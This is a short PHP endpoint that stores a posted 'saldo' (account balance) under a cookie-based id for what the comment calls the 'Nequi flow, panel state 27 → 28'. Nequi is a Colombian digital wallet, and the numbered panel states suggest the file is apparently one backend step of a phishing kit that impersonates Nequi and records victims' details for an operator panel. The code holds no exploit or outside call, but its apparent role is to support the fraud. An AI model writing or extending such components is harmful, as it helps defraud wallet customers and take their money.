<?php
/**
 * Guarda saldo disponible (flujo Nequi, estado panel 27 → 28).
 */
require_once('../lib/class.inputfilter.php');
require('../panel/include/setings.php');

date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

$id = isset($_COOKIE['id']) ? $ifilter->process($_COOKIE['id']) : '';
$saldo = isset($_POST['saldo']) ? $ifilter->process($_POST['saldo']) : '';

if ($id === '' || $id === '0' || $saldo === '') {
	http_response_code(400);
	echo 'ERR';
	exit;
}

put_saldo_nequi($id, $saldo);
echo 'OK';
